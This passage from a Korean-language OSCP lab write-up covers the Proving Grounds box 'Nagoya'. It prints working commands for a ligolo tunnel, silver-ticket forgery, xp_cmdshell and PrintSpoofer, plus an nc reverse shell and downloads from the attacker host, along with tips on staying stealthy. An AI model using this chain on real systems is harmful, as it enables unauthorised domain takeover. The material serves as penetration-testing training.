[-] Port 21 closed/filtered. Skipping ftp

[*] All active services checked.
```

**`[-] Port 1433 closed/filtered`** — 자격증명은 맞는데 서비스에 닿을 수가 없다. nmap 의 `65514 filtered` 가 여기서 의미를 갖는다. MSSQL 은 살아 있고 호스트 방화벽이 외부 접근만 막는다.

해법은 **christopher.lewis 셸을 발판 삼아 타겟 내부로 터널을 놓는 것**. ligolo-ng 를 썼다.

```bash
# (1) ligolo 인터페이스 UP  (없으면 먼저: sudo ip tuntap add user $USER mode tun ligolo)
sudo ip link set ligolo up

# (2) 타깃 로컬호스트로 갈 라우트. 240.0.0.1 은 ligolo 관례상의 "에이전트의 127.0.0.1"
sudo ip route add 240.0.0.1/32 dev ligolo

# (3) 프록시 = ligolo 콘솔
sudo ./proxy -selfcert -laddr 0.0.0.0:11601
```

![[Pasted image 20260707103550.png]]

에이전트는 evil-winrm 의 `upload` 로 올린 뒤 실행한다.

```powershell
*Evil-WinRM* PS C:\Users\Christopher.Lewis\Documents> upload agent.exe
*Evil-WinRM* PS C:\Users\Christopher.Lewis\Documents> .\agent.exe -connect 192.168.45.175:11601 -ignore-cert
agent.exe : time="2026-07-06T18:30:42-07:00" level=warning msg="warning, certificate validation disabled"
time="2026-07-06T18:30:42-07:00" level=info msg="Connection established" addr="192.168.45.175:11601"
```

![[Pasted image 20260707103620.png]]

`-ignore-cert` 없이는 `-selfcert` 로 만든 자체 서명 인증서를 에이전트가 거부한다. PowerShell 이 stderr 를 `NativeCommandError` 로 감싸 빨갛게 보이지만 **경고일 뿐이고**, 그 다음 줄의 `Connection established` 가 실제 결과다.

> [!note] 타겟 시계는 UTC-7 이다
> 위 로그의 `2026-07-06T18:30:42-07:00` 은 타겟 로컬 시각이고, KST 로는 2026-07-07 10:30:42 이다.
> 스크린샷 파일명(`20260707103620`)과 6분 차이가 나는데, 이건 **캡처 시각이 아니라 볼트에 붙여넣은 시각**이기 때문이다. 그래서 파일명 시각은 사건의 **상한**으로만 쓸 수 있다 — 6장 시간표에서 등급을 나눠 적은 이유다.

프록시 콘솔에서 세션을 잡고 터널을 연다.

```
ligolo-ng » INFO[0171] Agent joined.   id=005056abf3bf name="NAGOYA-IND\Christopher.Lewis@nagoya" remote="192.168.120.21:49860"
ligolo-ng » session
? Specify a session : 1 - NAGOYA-IND\Christopher.Lewis@nagoya - 192.168.120.21:49860 - 005056abf3bf
[Agent : NAGOYA-IND\Christopher.Lewis@nagoya] » start
INFO[0191] Starting tunnel to NAGOYA-IND\Christopher.Lewis@nagoya (005056abf3bf)
```

![[Pasted image 20260707103631.png]]

**`start` 를 안 치면 터널이 안 열린다.** 세션만 선택하고 끝내는 게 흔한 실수다. 확인:

```bash
┌──(kali㉿kali)-[~/git/ligolo]
└─$ ip route | grep 240
240.0.0.1 dev ligolo scope link

┌──(kali㉿kali)-[~/git/ligolo]
└─$ nc -zv 240.0.0.1 1433
nagoya.nagoya-industries.com [240.0.0.1] 1433 (ms-sql-s) open
```

![[Pasted image 20260707103642.png]]

`ip route` 에 **`linkdown` 이 붙어 있으면 인터페이스가 UP 이 아니다**. 그리고 `/etc/hosts` 에 `240.0.0.1 nagoya.nagoya-industries.com` 을 넣어둔 게 다음 단계의 전제다 — Kerberos 인증은 IP 가 아니라 **SPN 의 호스트명**으로 붙어야 하기 때문이다(`nc` 출력에 그 이름이 되비쳐 나오는 게 hosts 가 먹었다는 증거다).

---

## 4. 권한상승

### 4-1. 도메인 SID 확보

```powershell
*Evil-WinRM* PS C:\Users\Christopher.Lewis\Documents> [System.Security.Principal.WindowsIdentity]::GetCurrent().User.AccountDomainSid.Value
S-1-5-21-1969309164-1513403977-1686805993
```

![[Pasted image 20260707103653.png]]

칼리에서 자격증명만으로도 같은 값을 얻을 수 있다:

```bash
┌──(kali㉿kali)-[~/PG/Nagoya]
└─$ impacket-lookupsid nagoya-industries.com/craig.carr:Spring2023@192.168.120.21
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies

[*] Brute forcing SIDs at 192.168.120.21
[*] StringBinding ncacn_np:192.168.120.21[\pipe\lsarpc]
[*] Domain SID is: S-1-5-21-1969309164-1513403977-1686805993
498: NAGOYA-IND\Enterprise Read-only Domain Controllers (SidTypeGroup)
500: NAGOYA-IND\Administrator (SidTypeUser)
501: NAGOYA-IND\Guest (SidTypeUser)
502: NAGOYA-IND\krbtgt (SidTypeUser)
512: NAGOYA-IND\Domain Admins (SidTypeGroup)
513: NAGOYA-IND\Domain Users (SidTypeGroup)
514: NAGOYA-IND\Domain Guests (SidTypeGroup)
```

![[Pasted image 20260707111134.png]]

`AccountDomainSid` 는 계정 SID 에서 RID 를 뗀 값이라, `whoami /user` 결과에서 마지막 `-RID` 를 손으로 지워도 같다.

### 4-2. NT해시 만들기

```bash
┌──(kali㉿kali)-[~/PG/Nagoya]
└─$ python3 -c 'import hashlib;print(hashlib.new("md4","Service1".encode("utf-16le")).hexdigest())'
e3a0168bc21cfb88b95c954a5b18f57c
```

![[Pasted image 20260707111021.png]]

NT해시는 **UTF-16LE 로 인코딩한 평문의 MD4**다. 그게 전부다 — 솔트도 반복도 없다. `encode("utf-16le")` 를 빼거나 `utf-16`(BOM 포함)으로 쓰면 값이 달라진다. secretsdump 로 해시를 직접 얻었다면 평문 없이 그 값을 그대로 쓰면 된다.

### 4-3. 실버티켓 위조

```bash
┌──(kali㉿kali)-[~/PG/Nagoya]
└─$ impacket-ticketer -nthash e3a0168bc21cfb88b95c954a5b18f57c \
  -domain-sid S-1-5-21-1969309164-1513403977-1686805993 \
  -domain nagoya-industries.com \
  -spn MSSQL/nagoya.nagoya-industries.com \
  -user-id 500 Administrator
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies

[*] Creating basic skeleton ticket and PAC Infos
[*] Customizing ticket for nagoya-industries.com/Administrator
[*]     PAC_LOGON_INFO
[*]     PAC_CLIENT_INFO_TYPE
[*]     EncTicketPart
[*]     EncTGSRepPart
[*] Signing/Encrypting final ticket
[*]     PAC_SERVER_CHECKSUM
[*]     PAC_PRIVSVR_CHECKSUM
[*]     EncTicketPart
[*]     EncTGSRepPart
[*] Saving ticket in Administrator.ccache
```

![[Pasted image 20260707103942.png]]

플래그 하나하나가 필수다:

- `-spn` 이 있으면 **실버**티켓(그 서비스 전용), 없고 `-nthash` 가 krbtgt 것이면 **골든**티켓이 된다.
- `-domain-sid` 가 틀리면 PAC 안의 그룹 SID 가 도메인과 안 맞아 서비스가 거부한다.
- `-user-id 500` 이 사칭 대상. RID 500 은 빌트인 Administrator 고, ticketer 는 여기에 표준 그룹을 함께 박아 넣는다 — `-groups` 의 기본값이 `513, 512, 520, 518, 519`(Domain Users·Domain Admins·Group Policy Creator Owners·Schema Admins·Enterprise Admins)라 따로 줄 필요가 없다. **[가정]** 이 PAC 의 어느 SID 가 sysadmin 으로 이어졌는지는 기록에 없다. SQL Server 는 2008 이후 기본 설치에서 `BUILTIN\Administrators` 를 sysadmin 에 자동 추가하지 않으므로(이 인스턴스는 160 = SQL Server 2022) "빌트인 관리자 = sysadmin" 을 당연하게 여기면 안 된다. 관측된 것은 결과뿐이다 — 접속 직후 프롬프트가 `dbo@master` 였고 `sp_configure` 가 통했으니 그 세션은 sysadmin 이었다.
- `-domain` 은 대문자 realm 으로 정규화된다(`NAGOYA-INDUSTRIES.COM`).

만들어진 티켓은 파일 이름이 아니라 내용으로 확인한다:

```bash
┌──(kali㉿kali)-[~/PG/Nagoya]
└─$ export KRB5CCNAME=$PWD/Administrator.ccache

┌──(kali㉿kali)-[~/PG/Nagoya]
└─$ klist
Ticket cache: FILE:/home/kali/PG/Nagoya/Administrator.ccache
Default principal: Administrator@NAGOYA-INDUSTRIES.COM

Valid starting       Expires              Service principal
07/07/2026 10:39:08  07/04/2036 10:39:08  MSSQL/nagoya.nagoya-industries.com@NAGOYA-INDUSTRIES.COM
        renew until 07/04/2036 10:39:08
```

**유효기간이 10년**이다. 타깃 설정이 아니라 도구 산물이다 — ticketer 의 `-duration` 기본값이 87600시간(24×365×10)이다. 진짜 KDC 가 발급하는 서비스 티켓은 기본 10시간이니 이 한 줄만 봐도 위조임이 드러나고, 방어 관점에서는 그대로 탐지 지표가 된다(8장). 실제 평가에서 조용히 가고 싶으면 `-duration 10` 정도로 줄여야 한다.

`KRB5CCNAME` 을 **절대경로**로 export 하는 게 중요하다. impacket 이 상대경로를 그대로 들고 다니다가 작업 디렉터리가 바뀌면 못 찾는다.

### 4-4. MSSQL → xp_cmdshell

```bash
┌──(kali㉿kali)-[~/PG/Nagoya]
└─$ impacket-mssqlclient nagoya.nagoya-industries.com -k
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies

[*] Encryption required, switching to TLS
[*] ENVCHANGE(DATABASE): Old Value: master, New Value: master
[*] ENVCHANGE(LANGUAGE): Old Value: , New Value: us_english
[*] ENVCHANGE(PACKETSIZE): Old Value: 4096, New Value: 16192
[*] INFO(nagoya\SQLEXPRESS): Line 1: Changed database context to 'master'.
[*] INFO(nagoya\SQLEXPRESS): Line 1: Changed language setting to us_english.
[*] ACK: Result: 1 - Microsoft SQL Server (160 3232)
[!] Press help for extra shell commands
SQL (NAGOYA-IND\Administrator  dbo@master)>
```

![[Pasted image 20260707104041.png]]

**대상을 IP 가 아니라 `nagoya.nagoya-industries.com` 으로 준 것**이 핵심이다. `-k` 는 ccache 의 티켓을 쓰라는 뜻이고, 티켓 안의 SPN 은 `MSSQL/nagoya.nagoya-industries.com` 이다. IP 로 접속하면 클라이언트가 `MSSQL/240.0.0.1` 을 찾으려 해서 티켓이 안 맞는다. `/etc/hosts` 로 그 이름을 240.0.0.1(ligolo 터널)로 돌려놓은 이유가 이것이다.

프롬프트의 `NAGOYA-IND\Administrator` 가 위조가 먹혔다는 증거다.

```
SQL (NAGOYA-IND\Administrator  dbo@master)> enable_xp_cmdshell
INFO(nagoya\SQLEXPRESS): Line 196: Configuration option 'show advanced options' changed from 0 to 1. Run the RECONFIGURE statement to install.
INFO(nagoya\SQLEXPRESS): Line 196: Configuration option 'xp_cmdshell' changed from 0 to 1. Run the RECONFIGURE statement to install.
SQL (NAGOYA-IND\Administrator  dbo@master)> RECONFIGURE
SQL (NAGOYA-IND\Administrator  dbo@master)> xp_cmdshell whoami
output
--------------------
nagoya-ind\svc_mssql

NULL
```

![[Pasted image 20260707104209.png]]

**SQL 세션은 Administrator 인데 명령은 `svc_mssql` 로 실행된다.** xp_cmdshell 은 프록시 계정이 설정돼 있지 않으면 **SQL Server 서비스 계정 컨텍스트**로 프로세스를 띄우기 때문이다. 즉 실버티켓이 준 건 "SQL 안에서의 sysadmin"이지 "OS 관리자"가 아니다. 여기서 한 단계 더 가야 한다.

`enable_xp_cmdshell` 은 impacket mssqlclient 의 내장 헬퍼다. 수동으로는:

```sql
EXEC sp_configure 'show advanced options', 1; RECONFIGURE;
EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;
EXEC xp_cmdshell 'whoami';
```

### 4-5. SeImpersonate → PrintSpoofer

```
SQL (NAGOYA-IND\Administrator  dbo@master)> xp_cmdshell whoami /priv
output
--------------------------------------------------------------------------------
PRIVILEGES INFORMATION
----------------------
Privilege Name                Description                               State
============================= ========================================= ========
SeAssignPrimaryTokenPrivilege Replace a process level token             Disabled
SeIncreaseQuotaPrivilege      Adjust memory quotas for a process        Disabled
SeMachineAccountPrivilege     Add workstations to domain                Disabled
SeChangeNotifyPrivilege       Bypass traverse checking                  Enabled
SeManageVolumePrivilege       Perform volume maintenance tasks          Enabled
SeImpersonatePrivilege        Impersonate a client after authentication Enabled
SeCreateGlobalPrivilege       Create global objects                     Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set            Disabled
```

**`SeImpersonatePrivilege : Enabled`** — 서비스 계정에 거의 항상 붙어 있는 권한이고, 곧바로 Potato 계열이 통한다는 뜻이다. 셸을 잡으면 `whoami /priv` 부터 치는 이유가 이것.

바이너리 두 개를 올린다(칼리에서 `python3 -m http.server 80`).

```powershell
SQL (NAGOYA-IND\Administrator  dbo@master)> xp_cmdshell powershell -c "iwr http://192.168.45.175/PrintSpoofer64.exe -outfile C:\programdata\ps.exe;
output
------
NULL

SQL (NAGOYA-IND\Administrator  dbo@master)> xp_cmdshell powershell -c "iwr http://192.168.45.175/nc64.exe -outfile C:\programdata\nc64.exe";
output
------
NULL
```

![[Pasted image 20260707105403.png]]

**출력이 `NULL` 인 게 성공이다.** `iwr` 은 성공 시 아무것도 안 뱉는다 — 실패했으면 예외 텍스트가 나온다. `C:\programdata` 는 모든 계정이 쓸 수 있고 대개 감시가 느슨해서 스테이징 경로로 쓴다.

리스너를 띄우고,

```bash
┌──(kali㉿kali)-[~/PG/Nagoya]
└─$ rlwrap nc -lnvp 9001
listening on [any] 9001 ...
```

![[Pasted image 20260707105415.png]]

발사한다.

```powershell
SQL (NAGOYA-IND\Administrator  dbo@master)> xp_cmdshell C:\programdata\ps.exe -c "C:\programdata\nc64.exe 192.168.45.175 9001 -e cmd.exe"
output
-------------------------------------------
[+] Found privilege: SeImpersonatePrivilege

[+] Named pipe listening...

[+] CreateProcessAsUser() OK

NULL
```

![[Pasted image 20260707105425.png]]

세 줄이 각각 단계다 — 권한 확인 → 명명 파이프 대기 → 스풀러가 그 파이프에 붙어온 걸 사칭해서 새 프로세스 생성.

```bash
┌──(kali㉿kali)-[~/PG/Nagoya]
└─$ rlwrap nc -lnvp 9001
listening on [any] 9001 ...
connect to [192.168.45.175] from (UNKNOWN) [192.168.120.21] 50031
Microsoft Windows [Version 10.0.17763.4252]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Windows\system32>whoami
whoami
nagoya-ind\nagoya$
```

![[Pasted image 20260707105454.png]]

> [!warning] `nt authority\system` 이 아니라 `nagoya-ind\nagoya$` 가 나왔다
> 출처: `파일보관/Pasted image 20260707105454.png`. 화면에 그렇게 찍혀 있다.
> `nagoya$` 는 이 DC 의 **컴퓨터 계정**이다. BloodHound 수집분(`20260706153247_domains.json`)의 도메인 객체 ACE 를 보면 `Domain Controllers` 가 `GetChangesAll` 을, `Enterprise Domain Controllers`(S-1-5-9)가 `GetChanges` 를 갖는다. DCSync 는 **둘 다** 있어야 성립하는데 DC 머신 계정은 양쪽에 다 들어가므로 결과적으로 된다 — `GetChangesAll` 하나가 곧 DCSync 인 것은 아니다. 어느 쪽이든 도메인 관리자와 실질적으로 동등한 자리고, 실제로 Administrator 의 데스크톱을 그대로 읽었다.
> 왜 SYSTEM 표기가 아니라 머신 계정으로 떨어졌는지는 기록이 없다. **`[가정]`** 사칭된 토큰이 로컬 SYSTEM 이 아니라 네트워크 컨텍스트의 머신 계정이었을 가능성이 있으나, 이 박스에서 확인하지 않았다.
> 결과적으로는 상관없었지만, **`whoami` 가 SYSTEM 이 아니라고 실패로 판단하지 마라.** DC 에서는 머신 계정이 그 이상이다.

---

## 5. 플래그

리버스셸에서 `cd C:\Users\Administrator\Desktop` 후 `dir` → `type proof.txt`. 남아 있는 증거는 스크린샷 한 장이고, 그 화면에 찍힌 범위는 여기까지다:

```
 Directory of C:\Users\Administrator\Desktop

06/14/2023  02:53 AM    <DIR>          .
06/14/2023  02:53 AM    <DIR>          ..
06/14/2023  02:53 AM                41 email.txt
07/06/2026  06:24 PM                34 proof.txt
               2 File(s)             75 bytes
               2 Dir(s)  19,701,276,672 bytes free

C:\Users\Administrator\Desktop>type proof.txt
type proof.txt
be83df05d75cfee867192bdf8dcd2fdb
```

![[Pasted image 20260707105621.png]]

**`proof.txt` = `be83df05d75cfee867192bdf8dcd2fdb`** (출처: `파일보관/Pasted image 20260707105621.png`)

명령이 두 번씩 되비치는 건 `nc -e cmd.exe` 로 얻은 raw 셸의 에코다. **웹셸이 아니라 대화형 셸에서 원위치 `type`** 이므로 시험 기준으로도 유효한 취득이다.

`proof.txt` 의 타임스탬프 `07/06/2026 06:24 PM` 은 타겟 로컬 시각(UTC-7)이고 KST 로는 07-07 10:24 다. 07-06 저녁에 박스를 세워두고 다음날 아침 다시 켠 시각으로 보인다 — **[가정]** PG 는 부팅할 때 `proof.txt` 를 새로 쓰고, 07-06 에 바꿔둔 비밀번호가 07-07 에도 그대로 통했으니 리버트가 아니라 재기동이다.

### `local.txt` 는 기록에 없다

`~/PG/Nagoya/` 산출물, `~/.zsh_history`, 그리고 이 박스 구간에 붙여넣은 스크린샷 24장을 전부 열어 확인했지만 `local.txt` 를 읽은 흔적이 없다. 위 `dir` 도 Administrator 데스크톱만 보여준다. **그래서 이 박스의 판정은 1/2 다.**

가져오려면 christopher.lewis 의 WinRM 세션에서 `type C:\Users\Christopher.Lewis\Desktop\local.txt` 한 줄이면 됐다 — 셸은 이미 있었고 놓친 것이다. **[가정]** 표준 위치에 있었을 것으로 보이나 확인하지 않았다.

> [!warning] 시험 증거 형식
> 이 박스에서는 플래그만 찍었다. 시험에서는 `whoami; hostname; ip a` 를 **한 화면에** 같이 담아야 인정된다.
> 다행히 직전 스크린샷(`…105454.png`)에 `whoami` 와 접속 IP 가 있어 세트로는 성립하지만, **한 장에 담는 습관**을 들여야 한다.

---

## 6. 막혔던 지점 / 시행착오

산출물 mtime, `~/.zsh_history`, 도구가 스스로 찍은 타임스탬프, 그리고 스크린샷 파일명으로 복원한 것이다(`ssh -L 13389:…` 한 줄만은 히스토리가 아니라 원본 손기록에서 왔다). 모든 시각은 KST.

**근거의 등급이 다르다.** mtime 과 도구가 찍은 타임스탬프는 사건 시각이지만, 스크린샷 파일명은 3장에서 적었듯 **볼트에 붙여넣은 시각**이라 사건의 **상한**일 뿐이다. 실제로 어긋난다 — 노트에 안 쓴 스크린샷 `20260707105240.png`(10:52:40 붙여넣기)에 이미 리버스셸이 붙어 있고, 그 연결의 출발 포트 `50031` 이 10:54:54 스크린샷의 것과 같다. 즉 셸은 **10:52:40 이전**에 잡혔는데 관련 스크린샷들은 10:54 대에 붙여넣어졌다. 아래 표에서 둘을 갈라 적는다.

| 시각 | 사건 | 근거 | 등급 |
|---|---|---|---|
| 07-06 13:08–13:10 | nmap `-p-` (131초) | `nmap.log` 헤더 | 실측 |
| 13:25 / 13:32 / 13:35 | feroxbuster **3회** 종료 | ferox state 3개 mtime | 실측 |
| 13:32 | whatweb | `whatweb.log` mtime | 실측 |
| 13:52 | `names.txt` (28명) | mtime | 실측 |
| 14:07 | `users.txt` (405개) | mtime | 실측 |
| 14:36:30–14:38:49 | kerbrute (405개 중 26개 유효, 139초) | 도구 출력 | 실측 |
| 14:45 | `valid_users.txt` | mtime | 실측 |
| 14:55 | `season_pass.txt` | mtime | 실측 |
| ~15:00 | 스프레이 성공 (craig.carr) | — | 추정 |
| 15:32 | BloodHound 수집 | JSON 7종 mtime | 실측 |
| 15:55 → 15:56:13 | Kerberoast → hashcat (9초) | `hash.txt` mtime, hashcat 출력 | 실측 |
| 16:55:54 | `agent.exe` 복사 | mtime | 실측 |
| **16:55 → 07-07 10:28** | **약 17시간 30분 공백** | — | — |
| 07-07 ~10:27:51 | ligolo 프록시 기동 | 에이전트 접속(10:30:42)에서 콘솔의 `INFO[0171]` 을 뺀 값 | 역산 |
| 10:30:42 | 에이전트 접속 | `agent.exe` 로그 `2026-07-06T18:30:42-07:00`(타깃 UTC-7 → KST) | 실측 |
| ~10:31:02 | 터널 `start` | 콘솔 `INFO[0191]` | 역산 |
| 10:39:08 | `Administrator.ccache` 생성 | mtime (klist 의 `Valid starting` 과 일치) | 실측 |
| ≤10:40:41 | mssqlclient `-k` 접속 | 스크린샷 | 상한 |
| ≤10:42:09 | xp_cmdshell | 스크린샷 | 상한 |
| **≤10:52:40** | PrintSpoofer → 리버스셸 | 스크린샷 `…105240.png` 에 이미 연결돼 있다 | 상한 |
| ≤10:56:21 | `proof.txt` | 스크린샷 | 상한 |

**정찰 시작부터 플래그까지 실작업 약 4시간 15분** (07-06 13:08→16:55 = 3시간 47분, 07-07 10:28→10:56 = 28분). 공백은 하룻밤 중단이다.

### 실제로 시간을 태운 것들

**1. feroxbuster 3회 (13:25 / 13:32 / 13:35, 약 10분)**
확장자 조합을 바꿔가며 세 번 돌렸다(`php,html,txt,bak,zip` → `html,txt,php` → `html,txt,asp,aspx`). state 파일을 열어보면 **세 번 모두 200 응답은 똑같은 12개**다. 세 번째만 응답 총계가 913인데 그중 901이 **503**이다 — 새 경로를 찾은 게 아니라 `.asp/.aspx` 를 퍼붓다 IIS 가 뻗은 것이다. 그리고 세 state 전부 scan status 가 `Running` 이라 **완주한 실행은 하나도 없다.** 셋 다 손으로 끊었다.
→ 교훈: **ASP.NET Core/MVC 사이트에 확장자 사전을 늘리는 건 의미가 없다.** 라우팅이지 파일이 아니다. `/team` 을 첫 스캔에서 이미 봤으니 거기서 멈췄어야 했다.

**2. username-anarchy 경로·kerbrute 바이너리 헤매기 (약 25분)**
`users.txt`(14:07) 와 kerbrute 성공(14:36) 사이에 29분이 비는데, 히스토리를 보면 전부 사소한 것들이다:
- `./username-anarchy -i /home/PG/Nagoya/names.txt` — 경로 오타(`/home/kali` 누락). 다시 실행.
- 생성된 `users.txt` 가 도구 디렉터리에 떨어져서 `mv users.txt ~/PG/Nagoya`.
- `kerbrute userenum …` → PATH 에 없음. → `kerbrute_linux_386` (아키텍처 틀림) → `kerbrute_linux_amd64` 로 세 번째에 성공.
- 그 사이 `kerbrute … usernames.txt` 로 **없는 파일명**을 준 시도도 있다.
→ 교훈: 도구를 `~/git/` 에서 직접 실행하는 습관이 매번 이 비용을 만든다. PATH 에 넣어두면 끝난다(실제로 이 박스 도중에 `export PATH="$HOME/git/username-anarchy:$PATH"` 를 `.zshrc` 에 추가했다).

**3. 자격증명 없는 상태에서 무의미한 시도들 (14:07~14:45 구간)**
히스토리에 남은 것들:
- `nxc smb … -u users.txt -p ''` / `-p 'pass'` — 널 세션과 아무 비번. 둘 다 실패.
- `nxc smb … -u valid_users.txt -p 'FoundPass!'` — 플레이스홀더를 그대로 실행한 흔적.
- `smbclient //192.168.120.21` (공유명 없이) → `smbclient -L 192.168.120.21 -N` — 익명 열거 실패.
→ 교훈: 널 세션은 **한 번만** 때려보고 안 되면 넘어간다. Server 2019 DC 는 기본적으로 익명 열거를 막는다.

**4. AS-REP 로스팅 전멸 (14:45~14:55)**
26계정 전부 `doesn't have UF_DONT_REQUIRE_PREAUTH set`. 5분 정도 썼고, **이건 낭비가 아니다** — 자격증명 0개에서 공짜로 해시가 나올 수 있는 유일한 경로라 항상 먼저 때려본다. 안 나오면 즉시 스프레이로 넘어간다.

**5. svc_mssql 로 로그인 시도 (15:56 이후)**
비밀번호를 깼으니 당연히 로그인부터 시도했다.
- `evil-winrm -i … -u 'SVC_MSSQL' -p 'Service1'` → 실패. nxc 도 `WINRM [-]` 였다. Remote Management Users 소속이 아니다.
- `xfreerdp /u:svc_mssql /p:'Service1' /v:192.168.120.21 /dynamic-resolution +clipboard /drive:kali,/home/kali` → **원본 노트는 "로그인 불가"라고만 적혀 있고 xfreerdp 출력은 어디에도 남아 있지 않다.** nxc 는 `RDP [+]` 로 자격증명 자체는 유효하다고 판정했으므로, 실패 원인(대화형 로그온 권한 거부인지 다른 것인지)은 **기록에 없다.**
- `ssh -L 13389:192.168.120.21:3389 kali@192.168.164.130` — RDP 를 로컬로 당겨오려 한 흔적. 이후 기록이 없어 여기서 접었다.
→ 교훈: **"비밀번호를 깼다"와 "로그인할 수 있다"는 다른 문제다.** 서비스 계정은 대화형/원격 로그온이 막혀 있는 게 정상이다. 그때는 그 계정을 **로그인 수단이 아니라 암호 재료**로 볼 줄 알아야 한다(→ 실버티켓).

**6. `net rpc password` 인용부호 지옥 (히스토리에 4회 실패)**
```
net rpc password "christopher.lewis" 'Password123!' -U "nagoya-industries.com/iain.white%Password123 -S 192.168.120.21\
```
큰따옴표를 닫지 않은 채 줄 끝에 `\` 가 붙어 셸이 계속 다음 줄을 기다렸다. **이 형태가 세 번 반복되고**(그중 하나는 줄 끝 `\` 없이 같은 미종결 인용부호), 그 앞에 `iain.white` 를 대상으로 한 실패가 한 번 더 있다 — 인용부호는 맞았는데 줄 끝 `\` 만 붙은 경우다. 합쳐 네 줄. `evil-winrm … -p 'Password123\!'\` 처럼 `!` 를 백슬래시로 이스케이프하려다 실패한 것도 있다.
→ 교훈: **zsh 에서 `!` 가 든 비밀번호는 무조건 작은따옴표.** 큰따옴표 안에서도 히스토리 확장이 일어난다. 그리고 `-U 'DOMAIN/user%pass'` 는 통째로 한 덩어리라 따옴표를 중간에서 끊으면 안 된다.

**7. ccache 없이 `-k` 를 먼저 쳐본 흔적**
히스토리에 `export KRB5CCNAME=$PWD/Administrator.ccache\` (줄 끝 백슬래시)가 두 번, 그 사이에 `impacket-mssqlclient nagoya.nagoya-industries.com -k` 가 섞여 있다. export 가 줄 연속으로 먹혀 환경변수가 제대로 안 잡힌 상태에서 `-k` 를 쳤을 가능성이 크다.
※ zsh 히스토리는 세션 종료 시 기록되고 `hist_ignore_dups` 로 중복이 접히므로 **정확한 순서를 단정하지는 않는다.** 남은 건 "이 줄을 두 번 다시 쳤다"는 사실뿐이다.
→ 교훈: `-k` 를 치기 전에 **항상 `klist` 로 확인**한다. ccache 가 비면 impacket 은 조용히 다른 인증으로 넘어가거나 애매한 에러를 낸다.

**8. 1433 이 안 보인 것을 알아챈 시점**
nxc-sweep 이 `[-] Port 1433 closed/filtered. Skipping mssql` 을 뱉어줘서 바로 알았다. 만약 `impacket-mssqlclient` 를 그냥 쳤다면 타임아웃을 기다리며 "자격증명이 틀렸나" 하고 헤맸을 것이다.
→ 교훈: 자격증명을 얻으면 **서비스별로 한 번에 훑는 스윕**을 먼저 돌린다. "어디에 붙을 수 있는가"를 목록으로 보고 시작하는 것과 하나씩 찔러보는 것은 시간 차이가 크다.

---

## 7. OSCP 시험 관점

1. **웹에 사람 이름이 있으면 그게 계정 목록이다.** `/team`·`/about`·`/staff`·`/contact` 를 먼저 본다. `curl … | grep -oP '(?<=<td>)[A-Za-z]+' | paste - -` 한 줄이면 뽑힌다.
2. **실명 → 계정명은 username-anarchy, 검증은 kerbrute.** kerbrute 는 비밀번호를 보내지 않아 **계정 잠금이 없다.** 스프레이 전에 목록을 줄이는 유일하게 안전한 수단이다(405 → 26).
3. **비밀번호 후보는 사이트에서 읽어라.** 저작권 연도, 창립 연도, 지역명, 제품명. 계절+연도는 실제로 자주 통한다. 26계정에 4개면 계정당 4회 — **잠금 임계값 계산을 하고 들어간다.**
4. **스프레이는 `--continue-on-success`.** 첫 성공에서 멈추면 권한이 더 좋은 두 번째 계정을 놓친다.
5. **AD 자격증명을 하나라도 얻으면 즉시 BloodHound.** 이 박스의 2홉 ACL 경로는 사람이 LDAP 을 눈으로 훑어서는 못 찾는다. BloodHound 는 **열거 전용이라 시험에서 허용**된다.
6. **Kerberoast 는 자격증명 하나만 있으면 된다.** 도메인 사용자 아무나면 SPN 계정의 TGS 를 요청할 수 있다. etype 23 이면 hashcat `-m 13100`, rockyou 로 몇 초.
7. **비밀번호를 깼는데 로그인이 안 되면 그 해시를 티켓 재료로 써라.** 서비스 계정은 원래 로그인 권한이 없는 게 정상이다. `ticketer.py -spn <SPN> -nthash <NT> -domain-sid <SID> -user-id 500 Administrator`.
8. **nmap 이 안 보여준 포트가 없는 포트는 아니다.** `filtered` 가 대량이면 호스트 방화벽이다. 셸을 잡고 나면 **내부에서 다시 열거**한다(`netstat -ano`), 그리고 터널을 놓는다.
9. **서비스 계정 셸을 잡으면 `whoami /priv` 부터.** `SeImpersonatePrivilege : Enabled` = PrintSpoofer/GodPotato. 이 박스는 스풀러가 살아 있어 PrintSpoofer 가 통했다.
10. **DC 에서 `whoami` 가 `DOMAIN\HOST$` 로 나오면 성공한 것이다.** DC 머신 계정은 `Domain Controllers`(→ `GetChangesAll`)와 `Enterprise Domain Controllers`(→ `GetChanges`) 양쪽에 들어가고, DCSync 는 그 둘이 모두 있을 때 성립한다. SYSTEM 이 안 나왔다고 실패로 읽지 마라.

### 수동 대안 (자동 도구 없이)

| 쓴 것 | 대안 |
|---|---|
| username-anarchy | 손으로 규칙 5개(`f.last`·`flast`·`first.last`·`firstl`·`last`)만 만들어도 이 박스는 뚫린다 |
| kerbrute userenum | `impacket-GetNPUsers <도메인>/<user> -no-pass` 를 계정마다. 존재하면 preauth 에러, 없으면 principal unknown |
| nxc 스프레이 | `for p in $(cat pass); do for u in $(cat users); do smbclient -L //IP -U "$u%$p" …; done; done` |
| BloodHound | `impacket-lookupsid` 로 계정 열거 + `ldapsearch -x -H ldap://IP -D 'user@dom' -w pass -b 'DC=…' '(objectClass=user)' memberOf` 로 그룹 확인. 느리지만 같은 결론에 닿는다 |
| nxc-sweep | `nc -zv` 로 포트, 서비스별 클라이언트로 하나씩 |
| ligolo-ng | `chisel` 또는 `plink -R`. SSH 가 있으면 `ssh -L`. 이 박스에서 `ssh -L 13389:…` 를 시도한 흔적이 있다 |
| PrintSpoofer | GodPotato / JuicyPotatoNG. `SeImpersonate` 가 있으면 계열 중 하나는 통한다 |

**금지 도구 없음.** BloodHound·kerbrute·username-anarchy·nxc·impacket·hashcat·ligolo·PrintSpoofer 전부 열거 또는 단일 기법 도구라 OSCP 에서 허용된다. Metasploit 은 이 박스에서 쓰지 않았다.

### 시간 배분

- 웹 열거는 `/team` 을 찾은 순간(13:35) 끝났어야 했다. ferox 재시도 2회는 회수 불가.
- 도구 경로/아키텍처 헤매기 25분은 **환경 정비로 0 이 되는 비용**이다. 시험 전에 PATH 를 잡아둔다.
- **손절 지점**: Kerberoast 로 깬 계정이 어디에도 로그인이 안 되는 걸 확인한 순간(15:56 직후), "그럼 이 해시를 뭐에 쓰지"로 전환해야 한다. 로그인 시도를 30분 이상 붙들면 안 된다.
